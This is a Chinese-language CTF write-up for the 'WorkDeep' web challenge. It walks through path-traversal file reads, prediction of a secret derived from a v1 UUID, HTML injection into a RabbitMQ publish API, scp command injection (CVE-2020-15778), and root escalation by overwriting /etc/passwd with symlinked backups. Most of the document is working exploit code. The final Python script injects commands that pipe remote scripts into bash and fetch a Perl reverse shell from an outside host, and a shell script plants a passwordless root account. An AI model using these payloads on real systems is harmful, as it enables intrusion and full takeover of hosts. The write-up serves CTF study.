# WorkDeep
这题的流程比较复杂，但是每个知识点都不算很难，主要算是考察选手的综合能力（比如还有和逆向手的协作）。先讲一下整个的基本流程，再分点具体展开介绍。整体的攻击流程包括：
* 任意文件读取获得client的binary、node服务的源码、rabbitmq的配置文件、环境变量、ssh配置等题目所需信息（当然是一步步按照需求获取的）
* 利用node服务中对uuid的错误使用，预测secret的值，进而获得在http://127.0.0.1:8888域下的任意js代码执行
* 由于rabbitmq的配置中设置了对于http://127.0.0.1:8888源的cors策略，可以通过fetch等方法向rabbitmq的exchange发送任务达到和client交互的目的
* scp命令受CVE-2020-15778的影响，ssh的server端可以rce。反引号不受waf以及os.Exec的限制，同时通过读取ctf用户的id_rsa.pub和authorized_keys文件可以知道本地ctf用户可以ssh，因此利用这个漏洞可以获得ctf用户的执行权限。
* 由于flag在root目录，利用client的备份功能修改/etc/passwd提权到root获得flag。

## 任意文件读取
这一步的灵感来源于CVE-2018-1271，本质上是cleanPath逻辑认为`//`是一个空目录，而linux系统则认为这只是两个路径分隔符。因此 `/view?filename=.////////////////////////../../../../../etc/passwd` 这样的文件就可以bypass cleanPath函数。  
其实采用burp Intruder的也可以直接fuzz出结果。  
![1.png](./1.png)  

## 预测secret
node服务的代码如下
```
const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer');
const urlencode = require('urlencode');
const stringRandom = require('string-random');
const amqp = require('amqplib/callback_api');
const URL = require("url").URL;
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);
const { v1: uuid } = require('uuid');
const amqpUser = process.env.amqpUser || "guest";
const amqpPass = process.env.amqpPass || "guest";
const queueName = process.env.queueName || "test";
const enc = process.env.enc || "decc1b15a508a977eeca7a7b37dd6d116ab85d4f8f12a5147bef370a9bac3b797381997f96a4fc9f19e9ef651bd12d281747c24c247dc3113d63858c5cd7cbf62aa73ed55a0eb235e1891837a390ea9ce98f79e00ecaeaa262525aa7ec";

const app = express();
const port = 8888;
const maxnum = 30;
const secret = uuid().split("-")[0];

const validUrl = (s) => {
    try {
        new URL(s);
        return true;
    } catch (err) {
        console.log(err);
        return false;
    }
};

const stripStartBackslash = (s) => {
    return s.replace(/^[\/]+/g, '');
}

const cleanPath = (s) => {
    s = stripStartBackslash(s);
    let pathArray = s.split('/');
    let pathElement = [];
    let pos = 0;
    let arrlen = pathArray.length;
    for (let i=arrlen-1;i>=0;i--) {
        let ele = pathArray[i];
        if (ele == '.') {

        } else if (ele == '..') {
            pos++;
        } else {
            if (pos > 0) {
                pos--;
            } else {
                pathElement.unshift(ele);
            }
        }
    }
    for (let i=0;i<pos;i++) {
        pathElement.unshift('..');
    }
    return pathElement.join('/');
}

const sendTask = () => {
    amqp.connect(`amqp://${amqpUser}:${amqpPass}@localhost:5672/`, function(error0, connection) {
        if (error0) {
            return;            
        }
        connection.createChannel(function(error1, channel) {
            if (error1) {
                return;
            }
            let queue = queueName;
            let rfile = stringRandom(16);
            let msg = `{"Enc":"${enc}","RFile":"${rfile}.tar"}`;

            channel.assertQueue(queue, {
                durable: true
            });
            channel.sendToQueue(queue, Buffer.from(msg), {
                persistent: true
            });
            console.log("Sent '%s'", msg);
        });
        setTimeout(function() {
            connection.close();
        }, 1000);
    });
}  // send task to /client

app.use(bodyParser.urlencoded({ extended: false }))

app.get('/', (req, res) => res.send('get a screenshot with your homepage in /screen?url=https://rebirthwyw.com'))

app.get('/iframe', (req, res) => {
    if (typeof req.query.token != "string" || typeof req.query.ifrsrc != "string") {
        res.send('Invalid Token or Src');
        return;
    }
    let token = req.query.token;
    let rethtml = `<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta name="referrer" content="never">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        ${req.query.ifrsrc}
    </body>
    </html>`;
    if (token == secret) {
        res.send(rethtml);
    } else {
        res.send("Invalid Token");
    }
})

app.get('/screen', async (req, res) => {
    if (typeof req.query.url != "string") {
        res.send('not valid url');
        return;
    }
    if (!validUrl(req.query.url)) {
        res.send('not valid url');
        return;
    }
    let framehtml = `<iframe src="${req.query.url}"></iframe>`;
    let url = urlencode(DOMPurify.sanitize(framehtml, { ALLOWED_TAGS: ['iframe'], ALLOWED_ATTR: ['src'] }));
    let image = uuid().split("-")[0];
    res.send(`view screenshot in /view?filename=${image}.png`);
    try {
        const browser = await puppeteer.launch({
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-gpu',
                '--disable-dev-shm-usage',
                '--no-zygote',
                '--single-process'
            ]
        }); // copy from https://github.com/zsxsoft/my-ctf-challenges/blob/master/0ctf2020/amp2020/web/routes/index.js
        const page = await browser.newPage();
        await page.goto(`http://127.0.0.1:${port}/iframe?token=${secret}&ifrsrc=${url}`, {
            timeout: 3000
        });
        await page.screenshot({path:`files/${image}.png`});
        await browser.close();
        fs.readdir("files", (err, files) => { 
            if (err) {
            } else {
                if (files.length >= maxnum) {
                    sendTask();
                }
            } 
        })
    } catch (e) {
        console.log(e);
    }
})

app.get('/view', (req, res) => {
    if (typeof req.query.filename != "string") {
        res.send('not valid filename');
        return;
    }
    if (cleanPath(req.query.filename).indexOf('..')>=0) {
        res.send("No path traversal");
        return;
    }
    filename = `files/${req.query.filename}`;
    try {
        fs.readFile(filename, (err, data) => {
            if (err) {
                res.send('no image find');
            } else {
                res.attachment(filename);
                res.send(data);
            }
        });
    } catch (e) {
        res.send('no image find');
    }
})

app.listen(port, () => console.log(`listening on port ${port}!`))
```
漏洞点比较隐蔽，在最开始的初始化部分，采用了`const { v1: uuid } = require('uuid');`来获取uuid。  
查阅文档可以发现v1版本的uuid是和时间相关的随机数，看一下uuid的代码的话可以发现，uuid的第一节是完全和时间相关的一个值。  
![2.png](./2.png)  
因此，我们可以通过预测secret生成的时间来预测secret的值。  
这里就涉及到secret在什么时刻生成的问题。看了uuid的代码的话应该很容易发现是一个毫秒级的时间刻度，也就是预测偏差一秒，我们就需要发送1000个请求来验证。  
从ichunqiu的平台生成题目环境到选手能访问到环境的时间以及node服务进程启动到secret生成的时间如果仅仅通过第一个能访问通题目环境的请求返回时间来预测将非常的不准确，可能发送十几二十万个请求也无法预测到secret对应的时间戳，因此，我们需要一个准确的node服务启动时间。  
如何获取这个时间很显然，利用/proc目录。查阅文档可以发现，/proc/self/stat文件中包含一个starttime值，表示当前进程距离系统启动的jiffies次数，也就是相对的进程启动时间。  
![3.png](./3.png)  
而在/proc/stat文件中，有一个btime项，表示了系统启动的时间戳（秒级）。综合这两个值即可获取node服务启动的具体时间戳（毫秒级）。  
即`procstarttime=starttime*10+btime*1000`
我在本地测试时，secret生成距离进程启动时间大概在一秒左右，也就是一千多个请求即可获得secret值。在ichunqiu的平台上测试时，大概在五秒左右，即五千多个请求可以获得secret的值，这算是在可接受范围内的一种爆破。

## 与rabbitmq交互
获取secret值后，我们可以直接通过/iframe接口进行html注入，无需再绕过dompurify的过滤。但是rabbitmq的http服务开在15672端口，rabbitmq默认时禁止跨域的，basic认证的auth头无法传递。  
这时需要读取rabbitmq的配置文件`/etc/rabbitmq/rabbitmq.conf`获取到配置信息`management.cors.allow_origins.1 = http://127.0.0.1:8888`,也就是说在http://127.0.0.1:8888下可以跨域发送请求而被rabbitmq接受。 
rabbitmq的用户名密码以及队列信息可以在`/proc/self/environ`中获取，和rabbitmq交互的js代码如下
```
username = "backupadmin";
password = "WeakPassHere";
url = "http://127.0.0.1:15672/api/exchanges/%2F/amq.default/publish";
data = {"vhost":"/","name":"amq.default","properties":{"delivery_mode":2,"headers":{}},"routing_key":"backup","delivery_mode":"2","payload":"{\"Enc\":\"decc1b15a508a977eeca7a7b37dd6d116ab85d4f8f12a5147bef370a9bac3b797381997f96a4fc9f19e9ef651bd12d281747c24c247dc3116a38dec71fd789bd79ec3130a5a172f2cd17bb876382318a0f9034\",\"RFile\":\"1.tar.gz\"}","headers":{},"props":{},"payload_encoding":"string"};
fetch(url, {
    body: JSON.stringify(data),
    headers: {
        "content-type": "application/json",
        "Authorization": "Basic " + btoa(username+":"+password)
    },
    method: "POST",
})
.then(response => response.json())
.catch(err => console.error("Error:", error))
.then(response => console.log("Success:", response));
```

## scp rce
接下来的部分主要是go逆向以及其中的漏洞的查找，常见的利用IDAGolangHelper恢复函数名信息后开始逆向。结合node服务的代码，大概的流程应该是不难逆向的。  
主要的逻辑是在main_main_func1中，  
![4.png](./4.png)  
应该是先把rabbitmq发送过来的payload做json解码，然后将Enc字段解密。解密部分很清楚，就是用了AESGCM做的加解密，拿到nonce和key即可自己定制加密数据。  
![5.png](./5.png)  
然后在一些check以后就会调用backup和scp两个功能。
scp函数中，远程的文件地址是完全可控的，包括Enc数据中的user和host部分以及RFile参数。通过读取ctf用户的.ssh目录下的id_rsa.pub文件和authorized_keys文件可以判断可以通过id_rsa文件登录本地的ctf用户。结合CVE-2020-15778，通过控制RFile可以以ctf用户权限执行命令，即Enc的明文为`{"PriFile":"/home/ctf/.ssh/id_rsa","User":"ctf","Host":"127.0.0.1"}`，RFile的内容为 &#x0060;touch /tmp/1&#x0060; 。

## 提权
关注backup部分的功能，采用了tar打包的方式将`/home/ctf/app/files`目录打包成一个tar文件。在上一步中我们已经拥有了ctf权限的任意代码执行，同时tar打包时文件都是明文未修改的被加入到tar文件中的。因此，我们可以控制`/home/ctf/app/files`目录中只留有一个文件内容如下的文件
```
a

test:U6aMy0wojraho:0:0::/root:/bin/bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
ctf:x:2000:2000::/home/ctf:/bin/sh
epmd:x:102:102::/run/epmd:/usr/sbin/nologin
rabbitmq:x:103:104:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
systemd-network:x:104:106:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:105:107:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin

a
```
两个换行将头尾可能存在的脏数据隔离开，创建的test用户为空密码，这样的一个passwd文件即可使得我们拥有一个空密码的root权限用户。  
接下来就是如何让client替我们把这个打包的文件覆盖掉`/etc/passwd`文件。  
backup部分的代码会把tar打包的目标文件命名为一个秒级时间戳的tar文件，因此我们只要在`/home/ctf/backup`目录下将`/etc/passwd`文件软链接成许多秒级时间戳的tar文件，触发client的backup操作即可成功覆盖`/etc/passwd`  
具体的shell脚本如下(finalstep.sh)
```
#!/bin/bash
rm -f /home/ctf/app/files/*
starttime=`date +%s`
cp /etc/passwd /tmp/passwd.bak
for i in `seq 1000`
do
    ln -s /etc/passwd /home/ctf/backup/$((starttime+i)).tar
done
echo 'YQoKdGVzdDpVNmFNeTB3b2pyYWhvOjA6MDo6L3Jvb3Q6L2Jpbi9iYXNoCnJvb3Q6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gKZGFlbW9uOng6MToxOmRhZW1vbjovdXNyL3NiaW46L3Vzci9zYmluL25vbG9naW4KYmluOng6MjoyOmJpbjovYmluOi91c3Ivc2Jpbi9ub2xvZ2luCnN5czp4OjM6MzpzeXM6L2RldjovdXNyL3NiaW4vbm9sb2dpbgpzeW5jOng6NDo2NTUzNDpzeW5jOi9iaW46L2Jpbi9zeW5jCmdhbWVzOng6NTo2MDpnYW1lczovdXNyL2dhbWVzOi91c3Ivc2Jpbi9ub2xvZ2luCm1hbjp4OjY6MTI6bWFuOi92YXIvY2FjaGUvbWFuOi91c3Ivc2Jpbi9ub2xvZ2luCmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi91c3Ivc2Jpbi9ub2xvZ2luCm1haWw6eDo4Ojg6bWFpbDovdmFyL21haWw6L3Vzci9zYmluL25vbG9naW4KbmV3czp4Ojk6OTpuZXdzOi92YXIvc3Bvb2wvbmV3czovdXNyL3NiaW4vbm9sb2dpbgp1dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L3Vzci9zYmluL25vbG9naW4KcHJveHk6eDoxMzoxMzpwcm94eTovYmluOi91c3Ivc2Jpbi9ub2xvZ2luCnd3dy1kYXRhOng6MzM6MzM6d3d3LWRhdGE6L3Zhci93d3c6L3Vzci9zYmluL25vbG9naW4KYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovdXNyL3NiaW4vbm9sb2dpbgpsaXN0Ong6Mzg6Mzg6TWFpbGluZyBMaXN0IE1hbmFnZXI6L3Zhci9saXN0Oi91c3Ivc2Jpbi9ub2xvZ2luCmlyYzp4OjM5OjM5OmlyY2Q6L3Zhci9ydW4vaXJjZDovdXNyL3NiaW4vbm9sb2dpbgpnbmF0czp4OjQxOjQxOkduYXRzIEJ1Zy1SZXBvcnRpbmcgU3lzdGVtIChhZG1pbik6L3Zhci9saWIvZ25hdHM6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTAwOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMToxMDE6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpjdGY6eDoyMDAwOjIwMDA6Oi9ob21lL2N0ZjovYmluL3NoCmVwbWQ6eDoxMDI6MTAyOjovcnVuL2VwbWQ6L3Vzci9zYmluL25vbG9naW4KcmFiYml0bXE6eDoxMDM6MTA0OlJhYmJpdE1RIG1lc3NhZ2luZyBzZXJ2ZXIsLCw6L3Zhci9saWIvcmFiYml0bXE6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1uZXR3b3JrOng6MTA0OjEwNjpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6MTA1OjEwNzpzeXN0ZW1kIFJlc29sdmVyLCwsOi9ydW4vc3lzdGVtZC9yZXNvbHZlOi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDY6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgoKYQ==' | base64 -d > /home/ctf/app/files/a
```

## 完整exp
```
import requests
import urllib.parse

host = "192.168.248.150"

def getProcTime():
    url = f"http://{host}/view?filename=.////////////////////////../../../../../proc/self/stat"
    res = requests.get(url=url)
    _ = res.text.split(' ')
    return _[21]

def getBootTime():
    url = f"http://{host}/view?filename=.////////////////////////../../../../../proc/stat"
    res = requests.get(url=url)
    posx = res.text.find("btime ") + len("btime ")
    posy = res.text.find("processes")
    return(res.text[posx:posy-1])

def fuzzToken(starttime):
    msecs = starttime
    nsecs = 0
    while True:
        msecs += 1
        if (msecs - starttime) % 100 == 0:
            print(f"try {msecs-starttime} reqs")
        tmsecs = msecs + 12219292800000
        tl = ((tmsecs & 0xfffffff) * 10000 + nsecs) % 0x100000000
        cn = hex(tl)[2:]
        # print(cn)
        try:
            url = f"http://{host}/iframe?token={cn}&ifrsrc=123"
            res = requests.get(url=url)
            # print(res.text)
            # break
            if res.text.find('Invalid Token') == -1:
                print(f"find token in {msecs-starttime} reqs")
                return cn
        except Exception as e:
            pass

def initEnv():
    url = f"http://{host}/screen?url=http://118.89.245.122"
    requests.get(url=url)

def genHtml(rfile, token):
    html = '''<script>
username = "backupadmin";
password = "WeakPassHere";
url = "http://127.0.0.1:15672/api/exchanges/%2F/amq.default/publish";
data = {"vhost":"/","name":"amq.default","properties":{"delivery_mode":2,"headers":{}},"routing_key":"backup","delivery_mode":"2","payload":"{\\"Enc\\":\\"decc1b15a508a977eeca7a7b37dd6d116ab85d4f8f12a5147bef370a9bac3b797381997f96a4fc9f19e9ef651bd12d281747c24c247dc3116a38dec71fd789bd79ec3130a5a172f2cd17bb876382318a0f9034\\",\\"RFile\\":\\"''' + rfile + '''\\"}","headers":{},"props":{},"payload_encoding":"string"};
fetch(url, {
    body: JSON.stringify(data),
    headers: {
        "content-type": "application/json",
        "Authorization": "Basic " + btoa(username+":"+password)
    },
    method: "POST",
})
.then(response => response.json())
.catch(err => console.error("Error:", error))
.then(response => console.log("Success:", response));
</script>'''
    url = f"http://127.0.0.1:8888/iframe?token={token}&ifrsrc={urllib.parse.quote(html)}"
    return url

def changepasswd(token):
    cmd = "`curl${IFS}http://yourhost/finalstep.txt|bash`"
    expurl = genHtml(cmd, token)
    url = f"http://{host}/screen?url={urllib.parse.quote(expurl)}"
    print(url)
    return
    requests.get(url=url)

def getshell(token):
    cmd = "`curl${IFS}http://yourhost/1|perl`" #reverse shell
    expurl = genHtml(cmd, token)
    url = f"http://{host}/screen?url={urllib.parse.quote(expurl)}"
    print(url)
    return
    requests.get(url=url)


starttime = int(getProcTime())*10 + int(getBootTime())*1000
token = fuzzToken(starttime)
initEnv()
changepasswd(token)
getshell(token)
# python -c 'import pty;pty.spawn("/bin/bash")'
```